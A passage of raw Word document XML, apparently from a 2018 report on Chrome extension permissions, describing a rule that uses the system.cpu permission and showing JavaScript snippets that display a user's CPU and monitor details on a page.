                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu.archName</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'num-processors'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cpu.numOfProcessors</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="26BFF519" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="4A860AE3" w14:textId="1B642AC5" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 8: User’s CPU information.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="196"/>
    </w:p>
    <w:p w14:paraId="02D24E2D" w14:textId="5D9D9926" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="197" w:name="_Ref514844101"/>
      <w:bookmarkStart w:id="198" w:name="_Toc523071586"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: User’s CPU information.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="197"/>
      <w:bookmarkEnd w:id="198"/>
    </w:p>
    <w:p w14:paraId="590DC98C" w14:textId="2760835B" w:rsidR="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule uses the </w:t>
      </w:r>
      <w:r w:rsidRPr="006A4E27">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="199" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>system.cpu</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> permission to get information about the user’s </w:t>
      </w:r>
      <w:r w:rsidR="00B116AB">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9BEF09" w14:textId="452DEFDB" w:rsidR="007652E7" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E577842" w14:textId="77777777" w:rsidR="007652E7" w:rsidRPr="00F66EC0" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="200" w:name="_Toc523071522"/>
    <w:p w14:paraId="00F9D85B" w14:textId="7B38736E" w:rsidR="001175B2" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251691008" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0226C413" wp14:editId="196EE59B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>right</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>480060</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5924550" cy="198120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981200"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="45834038" w14:textId="0134AAA3" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>/**</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * (system.display)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> * Find out how many displays a user has.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve"> */</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:i/>
                                <w:iCs/>
                                <w:color w:val="629755"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.system.display.getInfo(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(displays){</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>// set html</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="808080"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>document.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>getElementById</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>'num-display'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">).innerHTML = </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>displays.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009A03A2">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0EB81097" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="134246ED" w14:textId="65248806" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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26C413" id="_x0000_s1038" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:415.3pt;margin-top:37.8pt;width:466.5pt;height:156pt;z-index:2516910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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="45834038" w14:textId="0134AAA3" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>/**</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * (</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>system.display</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> * Find out how many displays a user has.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve"> */</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:i/>
                          <w:iCs/>
                          <w:color w:val="629755"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.system.display.getInfo</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(displays){</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>// set html</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'num-display'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
